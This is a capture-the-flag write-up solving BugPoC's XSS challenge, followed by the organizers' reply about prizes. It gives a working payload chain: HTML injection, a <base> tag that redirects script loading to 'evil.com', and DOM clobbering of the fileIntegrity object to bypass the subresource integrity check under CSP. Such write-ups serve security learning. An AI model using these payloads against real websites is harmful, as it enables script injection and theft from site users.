title: Solution for XSS challenge wacky.buggywebsite.com

profile.name: BugPoC
profile.about: A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, & Red Team Reports.

vulnerability_information_html:
Summary:

Found a HTML injection in https://wacky.buggywebsite.com/frame.html?param=</title><h1>Injected</h1>

# Bypasswing CSP :

CSP : script-src 'nonce-txjohfomwjdo' 'strict-dynamic'; frame-src 'self'; object-src 'none';

Then found a vuln code in https://wacky.buggywebsite.com/frame.html

    <script nonce="jkbgowlguxyq">

        window.fileIntegrity = window.fileIntegrity || {
            'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
            'algorithm' : 'sha256',
            'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
            'creationtime' : 1602687229
        }

        // verify we are in an iframe
        if (window.name == 'iframe') {

            // securely load the frame analytics code
            if (fileIntegrity.value) {

                // create a sandboxed iframe
                analyticsFrame = document.createElement('iframe');
                analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
                analyticsFrame.setAttribute('class', 'invisible');
                document.body.appendChild(analyticsFrame);

                // securely add the analytics code into iframe
                script = document.createElement('script');
                script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
                script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
                script.setAttribute('crossorigin', 'anonymous');
                analyticsFrame.contentDocument.body.appendChild(script);

            }

As the src is a relative URL. we can use <base> tag to point that url to our site.
Ref : https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base

https://wacky.buggywebsite.com/frame.html?param=</title><base href="https//evil.com/"> will make the script to load from https//evil.com/files/analytics/js/frame-analytics.js

The only problem not it has is integrity check.

Solution :

window.fileIntegrity = window.fileIntegrity || {
This code is vulnerable to DOM clobbering.
And the value of integrity is taking from that fileIntegrity object.
So we can edit that value using DOM clobbering
Payload : <input id='fileIntegrity' name='fileIntegrity' value='intigrity-value'>
we can edit the integrity value and make the script loaded from our evil site get loaded.

Final Payload :

https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22+ evil-site + %22%3E%3Cinput%20id=%27fileIntegrity%27%20name=%27fileIntegrity%27%20value=%27h%20+integrity-hash-value+%27%3E

There is check in js , window.name = 'iframe', for that we set the window.name to iframe and then redirecting to the vuln site with payload.

Steps To Reproduce: (Proof of Concept)

  1. Open https://bugpoc.com/poc#bp-VCsULDMO
  2. Use the password : AwfulmUlE92
  3. Run the PoC , wait for 3 sec, there you sees the alert(origin).

Impact

XSS

Thanks for participating in our CTF Challenge! Your solution is correct, however unfortunately the 1st and 2nd place prizes have already been claimed. But do not worry - **your name has been entered into a Raffle to win $100!** 10 random winners will be announced on **November 10th**. Stay tuned- we will re-open and award this submission if you win!

This challenge also serves as the *first interview* for select Amazon Security Engineering roles! Please fill out [this form](https://forms.gle/qWFGpzMgANEBdDfT9) if you are interested in **skipping the first round of interviews** for select positions.

Reminder - the best blog write-up about this challenge will win $300! Submit yours *11/07 10pm EDT - 11/09 10PM EDT* by tagging @bugpoc_official on Twitter.
